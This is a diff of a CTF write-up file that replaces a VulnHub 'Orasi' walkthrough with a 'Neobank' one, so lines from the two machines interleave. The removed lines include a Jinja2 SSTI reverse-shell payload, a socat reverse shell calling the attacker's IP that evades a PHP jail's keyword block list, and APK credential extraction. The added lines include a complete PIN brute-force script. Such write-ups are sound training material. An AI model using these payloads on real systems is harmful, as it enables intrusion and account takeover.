@@ -1,391 +1,315 @@
 ---
-title: Orasi
-date: 02-21-2025
+title: Neobank
+date: 12-23-2024
 excerpt: VulnHub
-cover: ../uploads/cover_orasi.jpg
-tags: [reverse-engineering, ftp-anonymous, ssti, jinja2, sudo-misconfiguration, filter-bypass, socat, apk-reversing, hardcoded-credentials, python-code-injection, privilege-escalation, boot2root, vulnhub]
+cover: ../uploads/cover_neobank.jpg
+tags: Broken Authentication, 2FA Bypass, IDOR, Remote Code Execution, Privilege Escalation
 ---
 
-# Orasi: BOOT2ROOT CTF VULNHUB WRITEUP
+# Neobank: 1 BOOT2ROOT CTF VULNHUB WRITEUP
 
-Welcome back to another writeup! In this post, I'll be walking you through how I managed to pwn **Orasi** — a machine available on VulnHub. While **Orasi** has a reputation for being a tough box according to many in the community, I personally found it to be more approachable than expected once I broke it down step-by-step. Throughout this guide, I'll show you exactly how I tackled it. Let's dive in!!
+Welcome to my writeup on the *Neobank* machine from VulnHub. In this walkthrough, I will document the entire exploitation process as if conducting a formal penetration test. The objective is to simulate a real-world assessment by identifying and leveraging vulnerabilities to gain root access on the target system. This includes a structured approach involving initial reconnaissance, enumeration, exploitation, and privilege escalation. All steps are outlined clearly, supported with relevant tools and commands used during the engagement. This writeup aims not only to showcase the methodology but also to reinforce key principles in offensive security.
 
----
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FSa2bzu6YS6Zx4MkRGHe9%252F51ede97854c68d115c097abc3c074ddb.gif%3Falt%3Dmedia%26token%3D8acdf752-f40b-4086-bc51-fc75d73777c4&width=768&dpr=3&quality=100&sign=ec420fd2&sv=2)
 
-# Reconnaissance
-`tags: nmap, port-scanning`
+## Reconnaissance
 
-Let's scan for open ports using **Nmap** for potential entry points.
+### Scanning for Open Ports with Nmap
 
-`nmap -A -p- -T5 192.168.121.147`
+We will begin the assessment by performing a network scan using **Nmap** to identify open ports and potential entry points on the target system.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FQskSlxXDKODb0HfENmON%252FScreenshot%2520%28796%29.png%3Falt%3Dmedia%26token%3D1b977923-a740-49d9-8447-60fc4213f7a2&width=768&dpr=3&quality=100&sign=1e3a2f03&sv=2)
+`nmap -A -sC -p- T5 -oN nmap_result.log 192.168.191.78`
 
-Port 21(ftp), 22(ssh), 80(http), and also an http(5000)
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F655CdQHpGquIWTJCPqNy%252FScreenshot%2520%281304%29.png%3Falt%3Dmedia%26token%3D6ca96710-98e6-40c9-8286-54a6fb236d73&width=768&dpr=3&quality=100&sign=adaefef4&sv=2)
 
-## Vulnerability Discovered: FTP Anonymous Login
+HTTP open in 5000
 
-If you noticed, the ftp allow **Anonymous** access. So let's try to access ftp!
+### Inspecting the Web Login Page
 
-`lftp -u anonymous, 192.168.121.147`
+Next, we navigate to the HTTP service in a web browser to manually inspect the content served by the web server.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMmRiO3ufbL8hkMsKBYm3%252FScreenshot%2520%28798%29.png%3Falt%3Dmedia%26token%3Dbdb32fb0-980c-4f90-bfae-63cee4317c19&width=768&dpr=3&quality=100&sign=d2f4069&sv=2)
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMfNFUnf0PjQZWHZvOhYD%252FScreenshot%2520%281305%29.png%3Falt%3Dmedia%26token%3De785fdf1-2879-4875-8062-a261c8460682&width=768&dpr=3&quality=100&sign=d9e4c5a2&sv=2)
 
-Under **pub** directory, there's a file named **url**
+We are redirected to a login page asking for email and a pin
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcRAJaHc0jix5CIH0fSuX%252FScreenshot%2520%28799%29.png%3Falt%3Dmedia%26token%3D04b94904-82e9-4763-8e18-d34fc4eaebde&width=768&dpr=3&quality=100&sign=cc04b6dd&sv=2)
+## Enumeration
 
-It turns out that is an ELF executable binary.
+### Directory Enumeration with Gobuster
 
-Next thing I did is to transfer the **url** file to my attacker machine
+The next step involved performing directory enumeration using **Gobuster** to identify accessible subdirectories on the web server.
 
-`get url`
+`gobuster dir -u http://192.168.191.78:5000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 40 -x html,php,txt -q`
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD69ayROIU7VWv06zqOOK%252FScreenshot%2520%28800%29.png%3Falt%3Dmedia%26token%3D86563d44-f55f-44ca-8ae6-6a93a8aae7d3&width=768&dpr=3&quality=100&sign=8d3bacbd&sv=2)
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8kOgqH6Taww7y9fCmylk%252FScreenshot%2520%281307%29.png%3Falt%3Dmedia%26token%3D48a8e6a1-0447-46ce-9361-7eedda8cf0a6&width=768&dpr=3&quality=100&sign=6d06587b&sv=2)
 
-At my local machine I made it executable
+While scanning, a subdirectory name **/email\_list**
 
-`chmod +x url`
+### Discovering the Email List
 
-and execute
+We then accessed the discovered subdirectory to analyze its contents. The following observations were made:
 
-`./url`
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FecDkETHjlIaJtIjqKkIC%252FScreenshot%2520%281308%29.png%3Falt%3Dmedia%26token%3Dcf691c1f-e33d-4e1f-9eee-070276e42c86&width=768&dpr=3&quality=100&sign=b5666370&sv=2)
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FObENF6RH7YEVR360q3zp%252FScreenshot%2520%28802%29.png%3Falt%3Dmedia%26token%3D62c9dc3a-eaf7-487c-86b2-b55ccaee9979&width=768&dpr=3&quality=100&sign=3279705f&sv=2)
+11 neobank emails
 
-Nothing useful, so I fired up Ghidra to analyze the code and dig into its logic, hoping to uncover something hidden beneath the surface.
+Given that the page displays a collection of email addresses and the previously discovered login page requires an email for authentication, it was reasonable to assume one of these could be valid credentials. Therefore, the email addresses were extracted and saved to a file named `neobank_emails.txt` for further use.
 
-## Vulnerability Discovered: Hardcoded Path Hidden in Binary (Reverse Engineering)
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVJ00sCRSCCcrar8I8Rxp%252FScreenshot%2520%281309%29.png%3Falt%3Dmedia%26token%3D9d6a486b-ca85-4880-90d5-f382c22b250d&width=768&dpr=3&quality=100&sign=83906657&sv=2)
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvzekyTLkYguxDOTfWgQE%252FScreenshot%2520%28804%29.png%3Falt%3Dmedia%26token%3D0ad40ab7-e442-423a-b563-c7340e26fbb1&width=768&dpr=3&quality=100&sign=a6aeb03d&sv=2)
+At this stage, it might seem logical to proceed with a brute-force attack using the collected email addresses. While this is a viable option, it's important to first analyze the behavior of the login page when invalid credentials are submitted. This may reveal useful information or unexpected responses that could aid in the next steps.
 
-Notice the pattern? When we examine the **main** function more closely, some interesting behavior stands out. The code seems to be setting up values for certain operations by moving them into the source and destination indices, followed by a call to the **insert** function. Specifically, at lines 1192 and 1197, the opcodes **be** and **bf** are used, these correspond to instructions that move a value into the **ESI** (source index) and **EDI** (destination index) registers, respectively. The hexadecimal value immediately following each of these opcodes represents the actual data being assigned.
+### Analyzing the Login Page's Authentication Behavior
 
-I gathered all the hexadecimal values that were assigned to the source index just before each call to the **insert** function, and here's what I found
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDUM46aF9puUkiAf5RKbR%252FScreenshot%2520%281312%29.png%3Falt%3Dmedia%26token%3Dcb77d74a-a754-408f-8b2a-3f11a5619b28&width=768&dpr=3&quality=100&sign=3574aa32&sv=2)
 
-Next thing I did is to decode this hex to ASCII using **xxd** and here's the result
+It is noteworthy that the authentication mechanism does not provide explicit feedback or distinguishable error messages upon submission of invalid credentials. This behavior results in uniform server responses regardless of the legitimacy of the input, effectively obfuscating authentication failure events. Consequently, automated credential brute-forcing tools such as Hydra are rendered ineffective, as these tools depend on differential server responses to ascertain the validity of login attempts. The absence of response variance prevents reliable identification of successful authentications, thereby negating the utility of brute-force methodologies in this context.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDzUXh3l8cTtvGar5yyl4%252FScreenshot%2520%28807%29.png%3Falt%3Dmedia%26token%3D888e8453-fad0-4a47-945c-5df4645cf174&width=768&dpr=3&quality=100&sign=a86662a5&sv=2)
+However, how can we perform brute forcing under these conditions? While traditional tools may be ineffective, it is still possible to carry out a brute-force attack by developing a custom approach tailored to the system's specific behavior.
 
-This seems to resemble a URL path. Speaking of URLs, let's go ahead and check out the HTTP interface to see what's there.
+## Exploitation
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuxBeiW9QLmKc3jhYCnAU%252FScreenshot%2520%28805%29.png%3Falt%3Dmedia%26token%3D954de1a9-3169-4e3a-a1d6-500bec280f3d&width=768&dpr=3&quality=100&sign=e0c420ed&sv=2)
+### Building a Custom PIN Wordlist
 
-Hmm... the sequence **6 6 1337leet** looks familiar, it resembles the kind of syntax or pattern you'd see used in a specific tool.
+Before developing our brute-force script, it is necessary to generate an appropriate wordlist for potential PINs. Since we already possess a wordlist of email addresses, it is reasonable to assume that the PIN consists of up to six digits. To this end, we will extract numeric passwords of six digits or less from the `rockyou.txt` dataset, then sort and filter them accordingly to create a focused PIN wordlist.
 
-How about the other http? Port 5000 (Running in Python Server)
+To begin, I extracted all numeric values.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbNJmUiMRDoxrq0gdIilc%252FScreenshot%2520%28806%29.png%3Falt%3Dmedia%26token%3D95020599-39f1-4883-9c7a-aff1a9f0e6e9&width=768&dpr=3&quality=100&sign=f3a5aede&sv=2)
+`cat /usr/share/wordlists/rockyou.txt | egrep "^[0-9]*[0-9]$" > pins.txt`
 
-What if I add the decoded path?
+Next, I filtered the numeric values to include only those with six digits or fewer.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FT0RQXydjjRg5emrYPwLX%252FScreenshot%2520%28808%29.png%3Falt%3Dmedia%26token%3D409f891a-2821-4565-967d-09f065d27725&width=768&dpr=3&quality=100&sign=18d13584&sv=2)
+`cat pins.txt | grep -x '.\{6\}' | sponge pins.txt`
 
-This suggests that the path is expecting some kind of input, possibly a GET parameter. However, since we don't know the exact parameter name yet, we'll need to fuzz for it.
+With the comprehensive PIN list generated, encompassing all values from 000000 to 999999, we proceeded to develop a custom brute-force script to systematically test these credentials against the target authentication mechanism.
 
----
-
-# Enumeration
-`tags: crunch, ffuf, fuzzing, wordlist-generation`
-
-Let's head back to port 80. That **6 6 1337leet** pattern? Turns out, it's actually a syntax used in **Crunch**. Maybe we can use the generated wordlist to fuzz the GET parameter.
-
-`crunch 6 6 1337leet -o wordlist.txt`
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfZQcNGlcbO9QGWyUeUWn%252FScreenshot%2520%28809%29.png%3Falt%3Dmedia%26token%3D48cff127-4804-4596-a518-cb77ec9c0b9a&width=768&dpr=3&quality=100&sign=ad505158&sv=2)
-
-## Fuzzing the Hidden GET Parameter
-
-Now that we have the wordlist, let's fuzz the GET parameter using **ffuf**
-
-`ffuf -c -u 'http://192.168.121.147:5000/sh4d0w$s?FUZZ=so_drained' -w wordlist.txt -fs 8`
-
-The **-fs 8** option filters out responses with a size of 8. This means that, for every incorrect GET parameter, the server will return "No input" with a length of 8. However, for the correct parameter, the response size will likely vary since I've used a value longer than 8 characters. To observe the response sizes more clearly, we can remove the filter and analyze them directly. This is a fundamental step in fuzzing, just a heads-up in case you're not yet familiar with the process.
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXCtKJNEPWaVTdVlsmWz0%252FScreenshot%2520%28810%29.png%3Falt%3Dmedia%26token%3Db59ac619-ed3d-418c-926d-a2c5118b06b8&width=768&dpr=3&quality=100&sign=7ddae289&sv=2)
-
----
-
-# Exploitation
-`tags: ssti, jinja2, reverse-shell`
-
-## Vulnerability Discovered: Server-Side Template Injection (SSTI) in Jinja2
-
-Eventually, I identified the correct GET parameter. Given that the server is running Python, it's likely using **jinja2**-style templates. To verify this, I tried the following payload to see if the server is vulnerable to **server-side template injection (SSTI)**.
-
-```text
-{{10*10}}
-```
-
-Here's the result
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6WZKg7O9CCK841lfQyaJ%252FScreenshot%2520%28811%29.png%3Falt%3Dmedia%26token%3Daaccd17b-c005-4ef8-b8be-8efa18f3828c&width=768&dpr=3&quality=100&sign=75b14f6a&sv=2)
-
-It's confirmed!! At this stage, we can establish a reverse shell. Here's the payload
+### Writing a Custom Brute-Force Script
 
 ```python
-{% for cls in ().__class__.__base__.__subclasses__() %}{% if cls.__name__.find("warning") != -1 %}{{cls()._module.__builtins__.get('__import__')('os').popen("python3 -c 'import socket,os,pty,subprocess as sp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.121.32\",4444));[os.dup2(s.fileno(),fd) for fd in range(3)];pty.spawn(\"/bin/bash\")'")}}{% endif %}{% endfor %}
-```
-
-After running the payload through the **l333tt** parameter, we successfully gained a shell.
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJLOUrU6bgCJx3J3U3IIr%252FScreenshot%2520%28813%29.png%3Falt%3Dmedia%26token%3D4bddf9eb-ee01-4796-8245-2f8e9e68aa7b&width=768&dpr=3&quality=100&sign=9844321&sv=2)
-
-Navigating to the **home** directory, there are 2 users
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXlWKNXjgVy3Swdh96sSl%252FScreenshot%2520%28814%29.png%3Falt%3Dmedia%26token%3D03f310cc-7328-43de-afd6-d96ed144fcbb&width=768&dpr=3&quality=100&sign=89cc926d&sv=2)
-
----
-
-# Privilege Escalation (www-data → kori)
-`tags: sudo-misconfiguration, php-jail-bypass, filter-bypass, socat`
-
-## Vulnerability Discovered: Sudo Misconfiguration Allowing PHP Jail Execution
-
-Next thing I did is to check the sudo permissions of www-data
-
-`sudo -l`
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMXzYn9nkBREj9IjsrnUY%252FScreenshot%2520%28815%29.png%3Falt%3Dmedia%26token%3D3821c43f-70fa-4e7f-9729-17f6a43da582&width=768&dpr=3&quality=100&sign=49288d6b&sv=2)
-
-It turns out that we can execute a PHP script as user **kori**, next thing I did is to check the content of the **jail.php**
-
-```php
-<?php
-array_shift($_SERVER['argv']);
-$var = implode(" ", $_SERVER['argv']);
-
-if($var == null) die("Orasis Jail, argument missing\n");
-
-function filter($var) {
-        if(preg_match('/(`|bash|eval|nc|whoami|open|pass|require|include|file|system|\/)/i', $var)) {
-                return false;
-        }
-        return true;
-}
-if(filter($var)) {
-        $result = exec($var);
-        echo "$result\n";
-        echo "Command executed";
-} else {
-        echo "Restricted characters has been used";
-}
-echo "\n";
-?>
-```
-
-This is the reason why it gets harder, it's clear that the script is capable of executing commands. However, if the input contains specific keywords such as **bash, eval, nc**, and similar, it triggers a warning message saying "**restricted characters have been used.**" Additionally, the use of the slash (**/**) is also blocked, preventing us from referencing full binary paths like **/bin/bash**.
-
-## Filter Bypass Using Socat
-
-But they forgot something, just noticed that **socat** is not included, that's why I wonder if there's a socat in this and it has!!!! We can use socat, to spawn a shell as user kori!
-
-Next thing I did is to establish another listener in my local machine and execute this command in the target
-
-```shell
-sudo -u kori php /home/kori/jail.php socat TCP:192.168.121.32:3333 EXEC:'sh',pty,stderr,setsid,sigint
-```
-
-Execute and it should spawn a shell
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8CTs8M1g3GMjuRTVdQcE%252FScreenshot%2520%28818%29.png%3Falt%3Dmedia%26token%3D76adec79-d941-4087-a35e-0c38eb19ed79&width=768&dpr=3&quality=100&sign=b30b5a6a&sv=2)
-
-Next thing I did is to upgrade the shell
-
-`python3 -c 'import pty; pty.spawn("/bin/bash")'`
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgjPAmqxifquuRJnqdP3p%252FScreenshot%2520%28820%29.png%3Falt%3Dmedia%26token%3D10d306f4-b5a5-4a72-bb39-d3afca63b6bc&width=768&dpr=3&quality=100&sign=ea23288b&sv=2)
-
----
-
-# Privilege Escalation (kori → irida)
-`tags: sudo-misconfiguration, file-ownership-abuse, apk-reversing, dex2jar, procyon, hardcoded-credentials`
-
-## Vulnerability Discovered: Sudo Copy Command Abuse via File Ownership Trick
-
-I've checked the sudo permissions of the user kori
-
-`sudo -l`
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGpXdC8sKeoNu8IUg4wH4%252FScreenshot%2520%28821%29.png%3Falt%3Dmedia%26token%3D2b7ca524-a605-442f-b9c0-3383562f2912&width=768&dpr=3&quality=100&sign=e3e5a56c&sv=2)
-
-It appears that the user kori has permission to copy an APK file from irida's home directory into their own directory.
-
-`sudo -u irida cp /home/irida/irida.apk /home/kori/irida.apk`
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0vqUY55kfzd0I47RmoP8%252FScreenshot%2520%28822%29.png%3Falt%3Dmedia%26token%3Dc2396779-977c-4e20-8442-61c070f52c97&width=768&dpr=3&quality=100&sign=52396c0&sv=2)
-
-Why permission denied?
-
-Since we're now running commands as the user irida, we have access to the **irida.apk** file located in her home directory. However, irida doesn't have write permissions for kori's directory. To work around this, I had to modify the directory's permissions to allow write access for other users.
-
-`chmod o+w .`
-
-Then execute this again
-
-`sudo -u irida cp /home/irida/irida.apk /home/kori/irida.apk`
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FRehcgyCKHqtoJ8SA4wkR%252FScreenshot%2520%28823%29.png%3Falt%3Dmedia%26token%3Da4388c73-e0f1-4c1d-a9d8-63cdb397a200&width=768&dpr=3&quality=100&sign=d46b0e88&sv=2)
-
-But there's still a problem
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvWU87rWnB2UfrEUjaaNV%252FScreenshot%2520%28825%29.png%3Falt%3Dmedia%26token%3D39e14975-d915-4acf-a0f9-ca79ccd804f2&width=768&dpr=3&quality=100&sign=a30da704&sv=2)
-
-As you can see, the owner is still irida even though we've successfully copied it to kori, so technically, we cannot still access the apk file. What should we do?
-
-First we will delete the irida.apk in user kori and we will make a new one but empty
-
-`touch irida.apk`
-
-Then we will change file permission to **777** to give full access to everyone
-
-`chmod 777 irida.apk`
-
-Finally we will copy the apk again from irida
-
-`sudo -u irida cp /home/irida/irida.apk /home/kori/irida.apk`
-
-Here's the result
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0lugTqYS2RAfa0RjwLNC%252FScreenshot%2520%28827%29.png%3Falt%3Dmedia%26token%3D8246c895-cff4-413b-a715-6115b8c3f341&width=768&dpr=3&quality=100&sign=ed6615f3&sv=2)
-
-As you can see here, the owner of irida.apk is now kori!!
-
-## Vulnerability Discovered: Hardcoded Credentials in Decompiled APK
-
-I transfer the APK file to my local machine to decompile it
-
-target
-
-`php -S 0.0.0.0:1234`
-
-attacker
-
-`wget http://<target_ip>:1234/irida.apk`
-
-After transfer I decompile the APK file but first let's unzip the APK file
-
-`unzip irida.apk`
-
-Its internal structure will be extracted along with the **classes.dex**
-
-Next thing I did is to convert the classes.dex to Java archives using **d2j-dex2jar**
-
-`d2j-dex2jar classes.dex`
-
-Upon exploring the generated .class files, I found this file that seems interesting
-
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FlEVD1L13NHq21rduifnf%252FScreenshot%2520%28834%29.png%3Falt%3Dmedia%26token%3Da5dc8e4c-ba46-4126-8e73-20760364fc7b&width=768&dpr=3&quality=100&sign=707924c1&sv=2)
-
-The **LoginDataSource.class** caught my eye, so all I did is to decompile it using **procyon** and here's the decompiled version
-
-```java
-// 
-// Decompiled by Procyon v0.6.0
-// 
-
-package com.alienum.irida.data;
-
-import java.util.HashMap;
-import java.io.IOException;
-import java.util.UUID;
-import com.alienum.irida.data.model.LoggedInUser;
-
-public class LoginDataSource
-{
-    public Result<LoggedInUser> login(final String s, final String s2) {
-        if (s.equals("irida") && s2.equals(this.protector("1#2#3#4#5"))) {
-            try {
-                return new Result.Success<Object>(new LoggedInUser(UUID.randomUUID().toString(), "Irida Orasis"));
-            }
-            catch (final Exception cause) {
-                return new Result.Error(new IOException("Error logging in", cause));
-            }
-        }
-        return new Result.Error(new IOException("Error logging in", null));
+import requests
+import sys
+
+# Target endpoint URL for the login form
+TARGET_URL = "http://192.168.191.78:5000/login"
+
+# File paths to the wordlists containing email addresses and PINs
+EMAIL_LIST_PATH = "neobank_emails.txt"
+PIN_LIST_PATH = "pins.txt"
+
+def read_lines_from_file(path):
+    """
+    Reads lines from a file and strips whitespace.
+    Returns a list of non-empty lines.
+    Exits the program with an error message if the file can't be read.
+    """
+    try:
+        with open(path, 'r') as file:
+            return [line.strip() for line in file if line.strip()]
+    except Exception as e:
+        print(f"[!] Failed to read from {path}: {e}")
+        sys.exit(1)
+
+def attempt_login(email, pin):
+    """
+    Attempts to authenticate to the target URL using the given email and PIN.
+    Returns True if a valid credential is identified (based on status code and cookies).
+    """
+    session = requests.Session()
+    payload = {
+        "email": email,
+        "pin": pin
     }
+
+    try:
+        # Send the POST request with the login form data
+        response = session.post(TARGET_URL, data=payload)
+        code = response.status_code
+
+        # Log each attempt to track progress and responses
+        print(f"[*] Attempting {email}:{pin} --> HTTP {code}")
+
+        # Heuristic for successful login:
+        # HTTP 200 OK and exactly one session cookie received
+        if code == 200 and len(response.cookies) == 1:
+            print(f"[+] VALID CREDENTIAL FOUND")
+            print(f"    ├── Email       : {email}")
+            print(f"    ├── PIN         : {pin}")
+            print(f"    └── Status Code : {code}\n")
+            return True
+
+    except requests.RequestException as err:
+        print(f"[!] Request failed for {email}:{pin} --> {err}")
+
+    return False
+
+def main():
+    """
+    Main execution logic:
+    - Load wordlists for emails and PINs
+    - Begin brute-force attempts across all combinations
+    - Stop once a valid credential pair is discovered
+    """
+    emails = read_lines_from_file(EMAIL_LIST_PATH)
+    pins = read_lines_from_file(PIN_LIST_PATH)
     
-    public void logout() {
-    }
-    
-    public String protector(String string) {
-        final String[] split = string.split("#");
-        final HashMap hashMap = new HashMap();
-        hashMap.put(split[0], "eye");
-        hashMap.put(split[3], "tiger");
-        hashMap.put(split[4], "()");
-        hashMap.put(split[1], "of");
-        hashMap.put(split[2], "the");
-        final StringBuilder sb = new StringBuilder();
-        sb.append(hashMap.get(split[0]));
-        sb.append(".");
-        sb.append(hashMap.get(split[1]));
-        sb.append(".");
-        sb.append(hashMap.get(split[2]));
-        sb.append(".");
-        sb.append(hashMap.get(split[3]));
-        sb.append(".");
